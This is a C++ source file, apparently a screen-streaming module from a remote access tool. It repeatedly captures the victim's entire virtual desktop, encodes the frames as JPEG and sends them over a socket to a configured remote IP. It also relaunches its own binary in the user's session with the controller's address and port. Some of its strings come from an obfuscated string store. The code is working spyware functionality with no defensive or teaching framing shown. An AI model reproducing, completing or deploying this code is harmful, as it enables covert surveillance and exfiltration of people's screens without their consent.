#include"Globals.h"
#include"Strings.h"
#pragma comment(lib,"Gdiplus.lib")
#include <gdiplus.h>
#include"Conf.h"
#include"Utils.h"
using namespace Gdiplus;

namespace Screen {
    std::atomic<bool> stop = true;
    SOCKET scSocket=INVALID_SOCKET;
    std::vector<unsigned char> headers;
    std::vector<unsigned char>newl;

    int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {

        UINT num = 0;
        UINT size = 0;

        ImageCodecInfo* pImageCodecInfo = NULL;

        GetImageEncodersSize(&num, &size);
        if (size == 0)
        {
            return -1;
        }

        pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
        if (pImageCodecInfo == NULL)
        {
            return -1;
        }

        GetImageEncoders(num, size, pImageCodecInfo);

        for (UINT j = 0; j < num; ++j)
        {
            if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
            {
                *pClsid = pImageCodecInfo[j].Clsid;
                free(pImageCodecInfo);
                return j;  // Success
            }
        }

        free(pImageCodecInfo);
        return -1;  // Failure


    }


    int BitmapToJpg(HBITMAP hbmpImage, int width, int height) {
        int r = 0;
        Gdiplus::Bitmap* p_bmp = Gdiplus::Bitmap::FromHBITMAP(hbmpImage, NULL);

        CLSID pngClsid;
        int result = GetEncoderClsid(L"image/jpeg", &pngClsid);

        IStream* istream = nullptr;
        HRESULT hr = CreateStreamOnHGlobal(NULL, TRUE, &istream);
        p_bmp->Save(istream, &pngClsid);

        HGLOBAL hg = NULL;
        (void)GetHGlobalFromStream(istream, &hg);
        int bufsize = GlobalSize(hg);
        char* buffer = new char[bufsize];
        LPVOID ptr = GlobalLock(hg);
        if (!ptr) { goto end; }
        memcpy(buffer, ptr, bufsize);
        GlobalUnlock(hg);

        r = send(scSocket, (char*)&headers[0], headers.size(), 0);
        if (r <= 0) { goto end; }
        r = send(scSocket, buffer, bufsize,0);
        if (r <= 0) { goto end; }
        r = send(scSocket, (char*)&newl[0], newl.size(), 0);

        end:
        delete[] buffer;
        istream->Release();
        delete p_bmp;
        return r;
    }

    bool ScreenCapture() {


        int vsw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int vsh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        HDC hdcM = GetDC(NULL);
        if (hdcM == NULL) { return false; }
        HDC hDc = CreateCompatibleDC(hdcM);
        HBITMAP hBmp = CreateCompatibleBitmap(hdcM, vsw, vsh);
        SelectObject(hDc, hBmp);
        int smxv = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int smyv = GetSystemMetrics(SM_YVIRTUALSCREEN);
        while (!stop)
        {

            BitBlt(hDc, 0, 0, vsw, vsh, hdcM, smxv, smyv, SRCCOPY);
            if (BitmapToJpg(hBmp, GetSystemMetrics(SM_XVIRTUALSCREEN), GetSystemMetrics(SM_YVIRTUALSCREEN))<=0) { break; }
        }
        DeleteDC(hDc);
        DeleteDC(hdcM);
        DeleteObject(hBmp);
        return true;
    }


    bool StartScreen(SOCKET s) {
        SetProcessDPIAware();
        scSocket = s;
        headers = Strings::GetVect("ScreenShareHdr");
        newl= Strings::GetVect("newl");
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
        stop = false;
        ScreenCapture();
        closesocket(scSocket);
        GdiplusShutdown(gdiplusToken);
        return true;
    }
    bool StopScreen() {
        stop = true;
        return true;
    }

    void ScreenShareSpawn(std::string port) {

        
        std::wstring wip = Strings::strtow(Config::ip);
        std::wstring wport = Strings::strtow(port);

        std::wstring command_line(L" screen " + wip + L" " + wport);
        Log::SaveLog((wchar_t*)command_line.c_str());
        Utils::runAsUser(Config::currentpath, (wchar_t*)command_line.c_str());


    }
}

